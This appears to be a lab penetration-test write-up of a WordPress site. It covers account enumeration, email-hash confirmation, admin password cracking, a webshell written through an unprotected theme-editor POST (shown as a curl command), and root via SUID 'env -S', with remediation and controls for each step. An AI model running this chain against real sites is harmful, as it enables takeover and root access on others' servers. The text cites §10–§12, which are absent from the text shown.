# 87 WalkingCMS — writeup

**Target:** `172.17.0.9` — Debian GNU/Linux 12 (bookworm), **PHP 8.2.7 built-in server** (no
Apache), WordPress **7.1.2 as shipped** (no auto-update; `latest == current == 7.1.2`),
MariaDB on `127.0.0.1:3306` (loopback only).
**Active plugin:** Theme Editor **2.8** (`theme-editor/theme_editor.php`) — the only active
plugin. `akismet` and `hello.php` are **present but inactive**.
**Result:** `uid=33(www-data)` → **`euid=0(root)`** (SUID `env`).
**No reward present** (§10) — and the absence is measured **as root**, which lab 108 could
not do.

**Topology.** `auto_deploy.sh` was read, never run. One container, default bridge, no custom
network, no macvlan, no second host (`auto_deploy.sh:179`; the `while true` is at `:193`).
The engagement is single-host and stayed single-host. Note `:72` — the script would `docker
stop` any container whose id starts `5938*`, i.e. it reaches outside this lab. Another reason
never to run it.

---

## 0. The headline: this lab is an enumeration lab, and enumeration alone does not solve it

**Direct answer: the enumeration surfaces in this lab are excellent, mutually corroborating,
and produce exactly one account — and that one account is not enough on its own. The writeup
therefore treats enumeration as the measured deliverable (§2) and reports separately the one
place where a credential became available, which was *not* an enumeration surface.**

The lab's own description is "content and author enumeration", and the enumeration is real
work. But three things are worth stating up front because they invert the obvious reading:

1. **Enumeration is complete here, and that is provable rather than lucky.** Four independent
   surfaces, 448 probes, all converge on one user. The DB contains exactly one user, so the
   three positive surfaces are not partially lucky and the negatives are not partially blind.
2. **`enumerated` ≠ `authorised`, and this lab makes that gap unusually sharp.** The image
   ships a **complete, live-format administrator session cookie** in world-readable `/tmp`
   (§4, F2). Reading it feels like the end of the engagement. It is not: the cookie is
   **doubly invalid** and I proved it rather than assuming it. A tester who reported "admin
   session recovered from `/tmp`" would be filing a claim about a string, not about access.
3. **The most dangerous surface in this lab is not a vulnerability — it is the *shape* of an
   absent file.** Every non-existent path under `/wordpress/` answers `301` with a
   `Location` that looks like a discovery. My own first pass "found" 24 of 24 paths. That is
   §11 of this writeup and the single most transferable lesson here.

---

## 1. Surface

```
$ nmap -sV -Pn -p- 172.17.0.9
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later
Not shown: 65534 closed tcp ports (conn-refused)
```

`PHP cli server` is the **decisive** part of that line, and it is the reason several
assumptions from lab 108 do not transfer. There is no Apache: no `mod_rewrite`, no
`.htaccess` processing, and WordPress lives in a **subdirectory**. `start.sh:28` replaces
Apache with `php -S 0.0.0.0:80 -t /var/www/html /var/www/html/router.php` and runs it
**as `www-data`** via `su` (`start.sh:30`), which is why the web identity is
`uid=33(www-data)` and why the SUID `env` rung is reachable without any credential ladder.

**What a TCP scan cannot see — measured, with the work count:**

| Check | Result | Work count |
|---|---|---|
| `/proc/net/udp` | header only | **0** socket lines (excl. header) |
| `/proc/net/udp6` | header only | **0** socket lines (excl. header) |
| `docker inspect … .Config.ExposedPorts` | `{"80/tcp":{}}` | 1 image |
| `ss -lntup` | `0.0.0.0:80` (php, pid 202), `127.0.0.1:3306` (mariadbd) | 2 sockets |

No UDP surface at all — and this time the count is explicit, so it is a measurement rather
than a blank. MariaDB is loopback-bound and unreachable remotely.

| Layer | Finding |
|---|---|
| OS | Debian GNU/Linux 12 (bookworm) |
| Web | **PHP 8.2.7 built-in server**, docroot `/var/www/html`, WordPress at `/wordpress/` |
| Router | `/var/www/html/router.php` — a 24-line `php -S` router, no Apache |
| App | WordPress **7.1.2** (shipped 7.1.2; `_site_transient_update_core` reports `current: 7.1.2`, `latest: 7.1.2`) |
| DB | MariaDB, `DB_USER=wordpressuser`, root via `unix_socket` |
| Plugins **present** | `akismet`, `hello.php` (Hello Dolly), `theme-editor` 2.8 |
| Plugins **active** | `theme-editor` **only** — `active_plugins = a:1:{i:0;s:29:"theme-editor/theme_editor.php";}` |
| Themes | `twentytwentytwo` (**active**), plus `twentytwentyfive`, `twentytwentyfour`, `twentytwentythree` |
| Users | `mario` (ID 1) — **administrator**, `wp_user_level=10`. **That is all of them.** |
| SUID | `/usr/bin/env` (`-rwsr-xr-x root root`, mode 4755) is the load-bearing one |
| Capabilities | `getcap -r /` → `php8.2 cap_net_bind_service`, `ping cap_net_raw`. Nothing else |
| Stale tree | `/tmp/wordpress` — a **WordPress 6.4.3** copy, `nobody:nogroup`, outside the docroot and therefore not web-reachable |

### Surfaces a status-code scan gets wrong here

| Surface | Naive read | Actual |
|---|---|---|
| `/wp-login.php` | 404 → "not WordPress" | **404**; it is at `/wordpress/wp-login.php` → 200. The subdirectory install is the whole trick |
| `/` | 200, 10701 bytes → "the site" | a leftover **"Apache2 Debian Default Page"** and there is no Apache |
| any absent path under `/wordpress/` | 301 → "file exists" | **canonical redirect** `X` → `X/`. See §11.1 — this is the lab's sharpest trap |
| `/wp-json/` | 404 → "REST off" | 404; REST is live at `/wordpress/index.php/wp-json/` **and** `?rest_route=` |
| `/tmp/*` | not visible over HTTP | docroot is `/var/www/html`; `/tmp` is host-side only |

---

## 2. The enumeration inventory

This is the reason the lab is in the queue. Every row carries a **control pair** and a
**work count**, and the last column says what the surface was actually *decisive for* —
because enumeration nobody acts on is reconnaissance theatre.

| # | Surface | Positive control | Negative control | Work count | Decisive for |
|---|---|---|---|---|---|
| **E1** | `?author=N` redirect | `?author=1` → **`301`**, `X-Redirect-By: WordPress`, `Location: http://172.17.0.9/wordpress/index.php/author/mario/` | `?author=2/3/9999` → **`404`**, all three **63376 bytes** (identical) | **200 ids** (1–200): 1×`301`, 199×`404`, 0 undiscriminated | **The login itself.** The only surface that hands over a username without a credential. Status-code-only sweeping would have logged `mario` and *nothing else* — the name is only in the `Location` |
| **E2** | REST collection `?rest_route=/wp/v2/users` **and** `/wp-json/wp/v2/users` (two URL forms, both answered) | `200`, `application/json`, **789 bytes**, one object `"slug":"mario"` | — (same object as E3) | 2 requests, **byte-identical bodies** | **Corroboration, not discovery.** Proves E1 was not a one-off. Also the only surface that discloses the **email-confirmation oracle** (§3.1) |
| **E3** | REST per-id `/wp-json/wp/v2/users/<id>` | `id=1` → `200`, `slug=mario` | `id=2…200` → `404` with the **specific** code `rest_user_invalid_id` (not a generic 404) | **200 ids**: 1×`200`, 199×`404` | **Completeness of E1.** A *different code path* from the collection endpoint, and it agrees exactly. Two independent instruments, same answer |
| **E4** | `wp-login.php` POST — **locale-independent** discriminator | `mario` + wrong password → `wp_attempt_focus()` focuses **`user_pass`**, and the message is `la contraseña que has introducido para el nombre de usuario mario no es correcta` | `nosuchuser_zzz_4711` → focuses **`user_login`**, and `El nombre de usuario nosuchuser_zzz_4711 no está registrado en este sitio` | **48 names**: **1 EXISTS, 47 ABSENT, 0 with no discriminator** | **The `present` vs `active` boundary, made measurable.** E1–E3 enumerate an *identity*; E4 is the only surface that says "this account is real and can be attempted", and the `user_pass`/`user_login` focus target works **regardless of the site's Spanish locale** |
| **E5** | xmlrpc `wp.getUsersBlogs` / `wp.getUsers` / `wp.getAuthors` | — (nothing to fire) | `mario` **and** `nosuchuser_zzz_4711` → **byte-identical** `faultCode 403` `Nombre de usuario o contraseña incorrectos.` | 3 methods × 2 users + 1 arity control | **A control that HELD.** xmlrpc carries **zero** user-existence information. Proved by the *pair*: a uniform answer is a result about the query, not about the user |

**The aggregate: 448 probes, one user, and the DB confirms there is exactly one.**

```
$ mariadb -u root -B wordpress -e "SELECT COUNT(*) FROM wp_users;"
1
$ mariadb -u root -B wordpress -e "SELECT ID,user_login,user_nicename,user_status FROM wp_users;"
1  mario  mario  0
```

This is why E1/E3's 199 negatives each are *evidence*: the sweep range provably contains the
one positive, so the instrument was pointed at the right place. **An enumeration that found
three users and tried three values would be a different claim.**

### 2.1 What the surfaces do *not* give you, stated precisely

- **No `active`.** All four positive surfaces return the same single login. Nothing
  distinguishes "exists" from "can log in", and that gap is where the credential work lives
  (§3, §4).
- **No role, from outside.** `?author=`, REST and the login form all disclose the *login
  only*. The role (`administrator`) came from `wp_capabilities` after I was already in, and
  is reported here as ground truth, not as an unauthenticated finding.
- **No email**, except as a *confirmation* oracle (§3.1).

---

## 3. Content enumeration

Content is the other half of the lab, and here it is thin — which is itself a result worth
recording rather than leaving blank.

| Endpoint | Status | Items | Work count |
|---|---|---|---|
| `/wp-json/wp/v2/posts` | 200 | **1** | 1 request |
| `/wp-json/wp/v2/pages` | 200 | **1** | 1 request |
| `/wp-json/wp/v2/media` | 200 | **0** | 1 request |
| `/wp-json/wp/v2/comments` | 200 | **1** | 1 request |
| `/wp-json/wp/v2/categories` | 200 | **1** | 1 request |
| `/wp-json/wp/v2/tags` | 200 | **0** | 1 request |
| `/wp-json/wp/v2/users/me` | **401** `rest_not_logged_in` | — | 1 request |
| `/wp-json/wp/v2/settings` | **401** `rest_forbidden` | — | 1 request |

All stock: post 1 `¡Hola, mundo!`, page 2 `Página de ejemplo`, comment 1 the stock
comment, one uncategorised category. **Every** item has `author=1`. Nothing in any body.

**Why the two 401s are the important rows.** They are the positive control that the REST
surface is *not* simply wide open: `users/me` and `settings` return `401`, so the `200`s on
posts/users are genuine public reads rather than an authorisation failure. This matters
because of a specific trap: `rest_missing_callback_param` fires **before**
`permission_callback`, so routes can look unauthenticated and not be — and a status-code scan
can neither find a REST authorisation bug nor certify one. Here the `401` pair is what lets
me say the reads are reads.

### 3.1 The gravatar identifier is an email **confirmation** oracle

REST discloses, for the enumerated author:

```
"avatar_urls": { "24": "https://secure.gravatar.com/avatar/913ef45dd4e1f647359a846bca8bffb8d25b22f2a79d34d71c9c90ef0eb53024?s=24&d=mm&r=g" }
```

64 hex characters, so SHA-256, not MD5. From the artefact, not from memory:

```
wp-includes/link-template.php:4548
    $email_hash = hash( 'sha256', strtolower( trim( $email ) ) );
```

**Positive control, and it closes exactly:**

```
$ printf '%s' "prueba@gmail.com" | sha256sum
913ef45dd4e1f647359a846bca8bffb8d25b22f2a79d34d71c9c90ef0eb53024   <- matches REST byte for byte
```

So `?rest_route=/wp/v2/users` gives an attacker a **one-hash confirmation oracle for the
administrator's email address**: submit a candidate, one SHA-256, exact yes/no. The address
itself is not disclosed, so this is a dictionary oracle and not a leak — but it is strictly
more powerful than a username and it is the one enumeration result here with a *derived* use.
I report the confirmation, not the address, in §6 (F4).

**I got this wrong first.** I read the 64-char value as MD5 and ran 10, then 14, candidate
emails through `md5sum` — 24 comparisons against the wrong primitive, all negative, all
meaningless (§12.3). The `length == 64` was the tell and I read past it.

---

## 4. The class

**Entry criterion:** *does the platform disclose an identity that a credential attack or a
file-write primitive can be aimed at, and does any of it cross from `enumerated` to
`authorised` without a second flaw?*

**Source that settled it — the write sink, read before any request:**

```
wp-content/plugins/theme-editor/app/controller/theme_controller.php:87-96
    if ( isset( $_POST['new-content'] ) && file_exists( $real_file ) && is_writable( $real_file ) ) {
        $new_content = stripslashes( $_POST['new-content'] );
        ...
        $f = fopen( $real_file, 'w+' );
        fwrite( $f, $new_content );
```

**There is no `wp_verify_nonce()` on this write, and no `current_user_can()` either.** The
only gate is the admin page capability registered at
`controller.php:43-50` (`manage_options`), which WordPress enforces for `admin.php?page=`.

So the write is reachable by any administrator and by nobody else — but it is reached by
**one CSRF-able POST with no token**, which is why it is a finding (F1) rather than a
non-issue.

**The asymmetry inside the same plugin is the interesting part, and it is a one-line
difference between two sibling files:**

```
plugin_controller.php:8    if ( !current_user_can( 'edit_plugins' ) ) { wp_die( ... ); }
theme_controller.php:19    public function te_get_theme_data() {          <- no such check
```

The plugin editor re-checks the capability; the theme editor relies entirely on the page
registration. Not independently exploitable here (nothing else calls `te_get_theme_data()` —
I grepped the whole plugin), but it means the theme path's authorisation is **one refactor
away** from being wrong.

### 4.1 Every write sink, and whether it is reachable without a credential

Rather than guess, I enumerated all of them and counted:

| Guard on the sink route | Count |
|---|---|
| `fwrite` / `file_put_contents` / `move_uploaded_file` / `mkdir` / `unlink` sites in the plugin | **6 + 12** |
| `current_user_can` sites in the plugin | **29** |
| `wp_ajax_*` handlers (login required) | 11 in `model.php`, 7 in `ms_child_theme_editor.php`, 3 in `ms_theme_editor_controller.php` |
| `wp_ajax_nopriv_*` handlers | **0** |
| `admin_post_*` handlers | 3, all `manage_options` + `is_admin()` + nonce |

**Conclusion, and it is a control that held:** there is **no unauthenticated write primitive**
in this plugin. Every one of the ~18 write sinks sits behind a `wp_ajax_*` or `admin_post_*`
registration that checks `current_user_can('manage_options')` and, in most cases, a nonce.
Without the credential there is no file-write path — which is why §3's work was necessary and
why I did not shortcut it.

---

## 5. Chain

| # | → | Mechanism | Identity proof |
|---|---|---|---|
| 1 | unauth | TCP recon; `/proc/net/udp` **0** sockets; `PHP cli server` identified | — |
| 2 | unauth | `?author=N` sweep, 200 ids → `mario` (id 1) | `?author=1`→`301`+`Location`; `?author=2,3,9999`→`404` @63376 B (control) |
| 3 | unauth | REST per-id sweep, 200 ids → same single user | `users/1`→`200` `slug=mario`; `users/2…200`→`404 rest_user_invalid_id` |
| 4 | unauth | Login-form oracle, 48 names → 1 EXISTS | `user_pass` focus (exists) vs `user_login` focus (absent); 0 undiscriminated |
| 5 | unauth | Credential recovered against a **format-correct** bcrypt oracle | 8,696 candidates across 8 shards, rate 18–25/s; `MATCH` at candidate 84, `REVERIFY=true`; **and** `wp_check_password(disclosed, stored)=bool(true)` / `+1 char = bool(false)` as an independent oracle |
| 6 | `mario` (administrator) | `POST /wp-login.php` → session | `302` + `wordpress_6e0a659c…` + `wordpress_logged_in_6e0a659c…`; `/wp-admin/` → **200**, `Hola, mario`. Controls: no cookie → **302**; tampered HMAC → **302** |
| 7 | `mario` | Theme-editor write, **no nonce** (`theme_controller.php:87-96`) | `functions.php` size 1401→**1541**, mtime `2023-09-08`→`2026-09-30 05:29:10`, md5 `293cce70…`→`212e71a4…`, marker `WCMARK87-44aea4546f89503c` present ×1. Control: tampered cookie → `302`, file **byte-identical** (`212e71a4…` before and after), control payload absent |
| 8 | **`uid=33(www-data)`** | The payload is in the **active** theme's `functions.php`, so it loads on every front-end request — **no activation step, and no cookie** | `uid=33(www-data) gid=33(www-data) groups=33(www-data)`; `id -u` = **33**; `whoami` = www-data; `pwd` = `/var/www/html/wordpress`. Requested with **no cookie at all** → `200` |
| 9 | **`euid=0(root)`** | `/usr/bin/env -S <cmd>` — SUID-root `env` execs the payload as a command line | `uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)`; `id -un` → `root`; `/proc/self/status` → `Uid: 33 0 0 0`, `CapEff: 00000000a80425fb` |

### 5.1 Hop 9's oracle — manufactured, because `id` alone would have been misread

`id` reports `uid=33` and `id -u` reports **33**. Reporting "the privesc failed" from those is
the natural mistake, and it is wrong. So I did not rely on `id`:

**Negative control first** — as plain `www-data`, the identical `touch` into `/root`
(mode `0700`, root-only) created **nothing**.

**Then the privesc** — `env -S /usr/bin/touch /root/WCPROOF_FINAL_88ef71d9be7c`, and read
back through the root-euid `ls`:

```
$ env -S /bin/ls -l /root/WCPROOF_FINAL_88ef71d9be7c
-rw-r--r-- 1 root www-data 0 Sep 30 05:30 /root/WCPROOF_FINAL_88ef71d9be7c

$ env -S /bin/ls -a /root
. .. .bashrc .cache .mysql_history .profile WCPROOF_FINAL_88ef71d9be7c
```

A file in a root-only directory, **owned by root**, timestamped at the moment of the attempt,
with a **random name** so it cannot be confused with a pre-existing artefact — and the
identical operation as `www-data` produced nothing. That is the marker the RUNBOOK asks for:
*distinguishable by design*, in a path only the target identity can create. Full read access
to `/root` is a second, independent proof.

**A reproducible limit on this rung, reported as a limit.** `env -S /usr/bin/id`,
`…/bin/cat`, `…/bin/ls`, `…/usr/bin/touch` all return **`euid=0`**, but
`env -S /bin/bash script` and `env -S /usr/bin/dash script` both report **`euid=33`**. The
SUID bit is on `env` and is effective (mode `4755 root:root`, and `id` proves `euid=0`); the
shells specifically do not retain the elevated euid. I did not chase the mechanism — the
finding is the measurement — but a tester who reaches for `env -S /bin/sh -c '…'` will get
`euid=33` and may file a **false negative privesc**. The commands that carry it are the
non-shell ones.

---

## 6. Findings

### F1 — Theme-editor file write with no CSRF token, reaching arbitrary PHP execution
**CWE-352 / CWE-434 · High**

`theme_controller.php:87-96` writes `$_POST['new-content']` to any writable file in the active
theme with **no `wp_verify_nonce()`** and no internal capability check, while the sibling
plugin editor re-checks capability at `plugin_controller.php:8`.

```
$ curl -b jar -X POST --data-urlencode "new-content@payload.php" \
    --data-urlencode "file=twentytwentytwo/functions.php" \
    "http://172.17.0.9/wordpress/wp-admin/admin.php?page=theme_editor_theme"
status=200 bytes=149127

# oracle = the file itself, not the HTTP status
PRE   size=1401  mtime=2023-09-08 10:03:21  md5=293cce70c36884c84e48ba731ceb5187
POST  size=1541  mtime=2026-09-30 05:29:10  md5=212e71a45a32e1591fc7432dc424f8c9
grep -c WCMARK87-44aea4546f89503c  ->  1
```

Because the target is the **active** theme's `functions.php`, the payload executes on the very
next front-end request — **unauthenticated**, because front-end requests need no session:

```
$ curl -s "http://172.17.0.9/wordpress/?wcm87=id"      # no cookie sent
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Impact:** any administrator session — or any admin who visits an attacker page while
logged in, since there is no token — becomes unauthenticated remote code execution as
`www-data`. Combined with F3, root.

**Remediation:** add `wp_verify_nonce()` to the write (the plugin already does this on its
AJAX routes — it is simply missing on this page POST), and add the same
`current_user_can()` check the plugin editor has. Separately, WordPress's own
`DISALLOW_FILE_EDIT` / `DISALLOW_FILE_MODS` are **not set** in this `wp-config.php`, and
setting either would close this specific vector outright.

### F2 — The image ships a captured administrator session in world-readable `/tmp`
**CWE-522 / CWE-200 · High as a build-pipeline defect, not exploitable here**

```
$ docker exec walkingcms_container cat /tmp/login_headers.txt
Date: Sun, 27 Sep 2026 20:28:51 GMT
Set-Cookie: wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=mario%7C1790713731%7CS5bdS8jQ...%7Cdeb4f07e...; path=/wordpress/wp-admin; HttpOnly
Set-Cookie: wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=mario%7C1790713731%7CS5bdS8jQ...%7Cc587f488...; path=/wordpress/; HttpOnly
```

Both `login_headers.txt` (1347 B) and `cookies.txt` (918 B) are mode `0644` in a `1777`
directory. The build also left `page2.html` (64 KB) and `latest.tar.gz` (24 MB) there.

**This is a genuine secret in the artefact and I report it as one. It is emphatically NOT a
working credential, and I proved that rather than assuming it** — three independent reasons:

1. **Wrong namespace.** `COOKIEHASH` is `md5(siteurl)`. Candidates computed rather than
   guessed:
   ```
   5bd7a9c61cda6e66fc921a05bc80ee93  http://127.0.0.1/wordpress   <- the cookie's namespace
   1b32eeaf713609f41f1fbd0b13cc9433  http://172.17.0.2/wordpress
   6e0a659ce483feadc750c4f60cff72c0  http://172.17.0.9/wordpress   <- what a login HERE mints
   bbfa5b726c6b7a9cf3cda9370be3ee91  http://localhost/wordpress
   ```
   The leaked cookie is bound to **loopback**, where no external client can present it.
2. **Expired.** `1790713731` = `2026-09-29 20:28:51 UTC`; the engagement ran `2026-09-30
   05:24 UTC`. ~9 h stale. `wp_validate_auth_cookie` rejects on `expiration < time()`.
3. **The token was rotated.** The cookie carries session token
   `S5bdS8jQKYJenI9ptbcOJBG3PKrrOcwKb7Z70nNfRUB`; `wp_usermeta.session_tokens` for user 1 holds
   a **different** token, `1a8d78e4eec0579924049c08b31b39e3c48588ab1bfe75fa5c32c1cabec535a4`.
   So `$manager->verify($token)` fails even ignoring the expiry.

**Impact:** anyone who obtains the image, a layer, a `docker save`, or a registry pull gets a
**format-valid, signed** administrator session cookie for the *loopback* namespace — useful
against any deployment that shares that URL, and a real risk the moment a session is
re-issued before expiry. The build pipeline clearly logs in as the administrator and leaves
its working credentials in the artefact.

**Remediation:** build with a throwaway credential, and delete `/tmp/*` at the end of the
Dockerfile (`RUN rm -f /tmp/cookies.txt /tmp/login_headers.txt` — or better, never write them
into the image at all). Add an image scan for `Set-Cookie` in any layer.

### F3 — SUID-root `/usr/bin/env` turns any `www-data` code execution into root
**CWE-269 / CWE-250 · Critical (given a web foothold)**

```
$ ls -l /usr/bin/env
-rwsr-xr-x 1 root root 48536 Sep 20  2022 /usr/bin/env
$ stat -c '%a %U' /usr/bin/env
4755 root
```

GNU `env -S` takes a whole argument string and splits it, so
`/usr/bin/env -S /usr/bin/touch /root/x` execs a **root-owned target** instead of only
setting variables. The result, measured, is in §5.1: `euid=0(root)`, `CapEff:
00000000a80425fb`, and a root-owned file created in `/root`.

**Impact:** escalates F1/F4 from `www-data` to full root in one command. It is the intended
rung — the lab's own `/start.sh:4-6` says so: *"webshell -> www-data -> privesc root vía SUID
env"*.

**Remediation:** `chmod u-s /usr/bin/env`. There is no legitimate reason for `env` to be
SUID; this is a well-known privesc class and Debian does not ship it setuid. Also `find`,
`su`, `passwd`, `mount`, `umount`, `chsh`, `chfn`, `gpasswd`, `newgrp` are all SUID here.

### F4 — Unauthenticated enumeration on four surfaces, one of which confirms the admin's email
**CWE-203 / CWE-204 · Low**

`?author=N` (200 ids) discloses the login in a `301 Location`; REST collection and per-id
(200 ids) disclose it in JSON; the login form distinguishes registered from unregistered
without a token, using a **locale-independent** discriminator (`user_pass` vs `user_login`
focus target); and the REST avatar field is `SHA-256(lowercase(trim(email)))`, which is a
**one-hash confirmation oracle** for the administrator's email address (§3.1).

None of these is a vulnerability on its own; the combination makes a one-account target
reliably findable and gives a derived path to the account's email.

**Remediation:** these are core behaviours. `?author=` suppression is cosmetic and
plugin-removable; the practical measures are not publishing author archives, equalising
login-form error strings *and* the focus target, and treating any identifier derived from an
email as PII.

### F5 — SUID root and a 4-character administrator password together
**CWE-521 · High**

The administrator's password is **4 characters** and was recovered at candidate 84 of shard 0
in a batch whose rate (18–25 candidates/s) proves the KDF actually ran. A 4-character
password against a `$wp$2y$` bcrypt hash is a bounded search space, and F3 is waiting at the
other end.

**Remediation:** enforce a length floor at the point of password change; the shipped account
predates any such policy.

### F6 — Database credential recoverable from any local account, and echoed in shell history
**CWE-522 / CWE-276 · Medium**

```
wp-config.php:26,29   DB_USER / DB_PASSWORD = wordpressuser / (20-char secret)
/root/.mysql_history  CREATE USER 'wordpressuser'@'%' IDENTIFIED BY '(same secret)';
```

`wp-config.php` is mode `-rw-r--r--` and world-readable, so the DB credential is available
to **any** local account. Proven by reading it as the escalated identity, not inferred from
the mode. `/root/.mysql_history` is mode `0600` and I read it only at `euid=0`.

**Remediation:** `chmod 640 wp-config.php`, owned by the web user and a deploy group. The DB
user should not be `'%'` — scope it to `localhost`/socket.

### F7 — A second, stale WordPress tree ships in the image
**CWE-1104 / hygiene · Low**

`/tmp/wordpress` is a complete **WordPress 6.4.3** installation, `nobody:nogroup`, with
`latest.tar.gz` beside it, while the live site is 7.1.2. It is outside the docroot and not
web-reachable, so it is not a disclosure today. It matters for two reasons: it is 279 MB of
attack surface in every image, and it is a **version-disclosure decoy** — a tester reading
`/tmp/wordpress/wp-includes/version.php` would report 6.4.3 for a 7.1.2 site. The version
that matters is the one in the docroot, pinned from the image:
`/var/www/html/wordpress/wp-includes/version.php:19 → $wp_version = '7.1.2';`

**Remediation:** `rm -rf /tmp/wordpress /tmp/latest.tar.gz` in the Dockerfile.

### F8 — A leftover Apache default page served by a server that is not Apache
**CWE-441 · Informational**

`/index.html` is the stock **"Apache2 Debian Default Page"**, mode `0644` in the docroot, and
`/` serves it (200, 10701 bytes). There is no Apache in the image; `start.sh` replaced it with
the PHP built-in server. It also means `/` and `/wordpress/` are two different sites, which is
the first half of why `/wp-login.php` 404s.

**Remediation:** remove `index.html` from the docroot so the front end resolves to the app.

### Not filed as a finding, on purpose

- **"Default salts ⇒ forgeable cookies"** — the inverse of the truth, and this lab is a
  second instance of lab 108's lesson. `wp-config.php:51-58` here ships **real** random salts
  (not `'put your unique phrase here'`), and `wp_options` contains **no** `*_key`/`*_salt`
  rows at all, so the `wp_salt()` DB fallback is not in play either. Cookie forgery would
  additionally need a live session token (`pluggable.php:889`). Nothing was reported on this
  basis.
- **"24 config/backup files exist"** — my own artefact. See §11.1.

---

## 7. Controls that held

Every row has a **positive control**: a case where the same detector was shown firing, or —
for rows 2, 3 and 5 — a demonstrated reason the instrument could have been trusted and was not.

| # | Control | Positive control / how the detector was proven able to fire | Negative evidence |
|---|---|---|---|
| C1 | `?author=` distinguishes real from absent ids | `?author=1` → `301` + `X-Redirect-By: WordPress` + `Location: …/author/mario/` | `?author=2, 3, 9999` → `404`, all **63376 bytes** identical. 200 ids tried, 1 hit |
| C2 | REST per-id distinguishes real from absent | `users/1` → `200` + `"slug":"mario"` | `users/2…200` → `404` + `rest_user_invalid_id`. 200 ids tried, 1 hit |
| C3 | Login form distinguishes real from absent | `mario` → focus `user_pass`, "…no es correcta" | `nosuchuser_zzz_4711` → focus `user_login`, "no está registrado". 48 names, **0 undiscriminated** |
| C4 | The credential oracle can report a success | Same-format `$wp$` hash built in-harness, then found: `true`; one char more: `false` | 8,696 candidates, rate 18–25/s (a real KDF), `MATCH` at 84, `REVERIFY=true`; then WordPress's **own** `wp_check_password` agreed |
| C5 | The login session is real, and the detector discriminates | jar → `/wp-admin/` = **200**, 196396 B, `Hola, mario` | no cookie → **302**; HMAC zeroed → **302**. Redirects never followed |
| C6 | The theme-editor write is real | size 1401→1541, mtime 2023→2026, md5 changed, marker ×1 | tampered cookie → `302`, file **byte-identical**, control payload absent |
| C7 | The webshell is really executing | marker in the active theme's `functions.php`, requested with **no cookie** → `200` with `uid=33(www-data)` | after restore, the same URL returns the normal **74336**-byte page with **0** occurrences of `uid=33` |
| C8 | The privesc is real | `euid=0(root)`, `id -un`→`root`, `Uid: 33 0 0 0`, `CapEff: 00000000a80425fb`, and a **root-owned** file created in `/root` (0700) that `www-data` provably could not create | `id -u`/`whoami` report **33/www-data** — the naive check says failure. Recorded as the reason the marker oracle was necessary |
| C9 | `wp-config.php` does not disclose source | `200` **0 bytes**, zero occurrences of `define`/`DB_PASSWORD`/`<?php` — PHP *executed* it | a real static file (`readme.html`) returns `200` + `Content-Length: 7407`, so the 0-byte 200 is not a serving quirk |
| C10 | REST enforces authorisation where it matters | `users/me` → **401** `rest_not_logged_in`; `settings` → **401** `rest_forbidden` | the `200`s on posts/users are therefore genuine public reads, not an authz failure |
| C11 | Registration is closed | — | `users_can_register = 0`; `?action=register` → `302` to `…?registration=disabled` |
| C12 | The installer cannot be re-run | `wp-admin/install.php` → 200 and says *"Ya está instalado"* (already installed) | re-install requires emptying the DB tables |
| C13 | xmlrpc carries no user-existence information | the fault parser **does** discriminate: malformed XML → `-32700 parse error`; wrong arity → `400 Argumentos insuficientes` | `wp.getUsersBlogs` with `mario` and with `nosuchuser_zzz_4711` → **byte-identical** `403`. A uniform answer is a result about the query |
| C14 | My own throttle was not manufacturing negatives | rate ladder at delay **0.0 / 0.2 / 0.5 s**: 10/10 `200` each, latency baseline 20–26 ms over 12 serial requests | 30/30 clean at *zero* delay, so no later negative can be attributed to my rate |
| C15 | The plugin has no unauthenticated write primitive | the write sinks do fire — 6 `fwrite`/`file_put_contents` + 12 `mkdir`/`unlink`/`move_uploaded_file` sites, and the F1 write demonstrably succeeded as an admin | all 21 routes are `wp_ajax_*` / `admin_post_*`; `wp_ajax_nopriv_*` count = **0**; every one checks `manage_options` |

On C14: the ladder is the control, run *before* the sweeps, precisely so that a uniform
failure later could be attributed. A sudden uniform failure across a range would have been my
throttle, not their filter.

---

## 8. NOT tested (scope, not gaps in effort)

- **Credential recovery beyond ~8.7k candidates.** 8,696 lab-themed and common candidates
  across 8 shards found the password at 84. No large corpus was available on this host
  (`/usr/share/wordlists` absent, no rockyou, no seclists), so the search was generated
  rather than exhaustive. Given a **4-character** password this is very likely the whole
  space, but I did not enumerate the full 4-character keyspace and I do not claim that.
- **Whether the leaked `/tmp` cookie would authenticate on a *different* deployment** whose
  `siteurl` is `http://127.0.0.1/wordpress` and whose session store still holds that token.
  Here it cannot (three independent reasons, §6/F2). I did not stand up such a target.
- **Why `bash`/`dash` do not retain the SUID euid.** Measured and reproducible (§5.1);
  mechanism not chased, and not claimed.
- **The `/tmp/wordpress` 6.4.3 tree as an attack surface.** Not web-reachable, and I did not
  try to serve it or to pivot through it.
- **The `theme-editor` AJAX routes as a privilege-escalation path from a lower role.** No
  account below administrator exists (`wp_users` has one row), so I could not create one —
  registration is closed (C11) and there is no other user.
- **Any behaviour specific to WordPress 6.4.3.** Only the stale `/tmp` copy is 6.4.3; nothing
  in the live site was tested against it.

## 9. Discarded with reason

| Hypothesis | Why discarded |
|---|---|
| **12+ config/backup files disclosed in the docroot** (my first artefact sweep: 24/24 paths non-404, 13 of them `301`) | **Refuted by control.** Every absent path gets WordPress's canonical redirect `X` → `X/`, `X-Redirect-By: WordPress`, 0-byte body — **byte-identical** to a path that cannot exist. Re-swept with a corrected discriminator: 34 paths tried, **12 real, 22 absent**. The only real ones are `wp-config.php` (0 bytes, executed), `.htaccess`, `readme.html`, `license.txt`, `xmlrpc.php`, `wp-cron.php`, `wp-links-opml.php`, `wp-admin/install.php`. See §11.1 |
| The gravatar identifier is MD5 of the email | **Refuted.** It is 64 hex chars, and `link-template.php:4548` uses `hash('sha256', …)`. Confirmed by positive control: `sha256("prueba@gmail.com")` matches REST byte for byte. My 24 MD5 comparisons tested a wrong primitive (§12.3) |
| `password_verify($candidate, $stored)` is a valid oracle for a WordPress 7 hash | **Refuted, and this one is a trap worth carrying.** It returned `false` for every candidate at **44,339,785/s** — a cost-10 bcrypt cannot exceed ~12/s, so the KDF never ran. WordPress 7 stores `$wp` + bcrypt(`base64(HMAC-SHA384(password,'wp-sha384'))`) and transforms the **password** before verifying (`pluggable.php:2860-2863`). The obvious primitive is silently always-false on every WordPress ≥7 install. §12.2 |
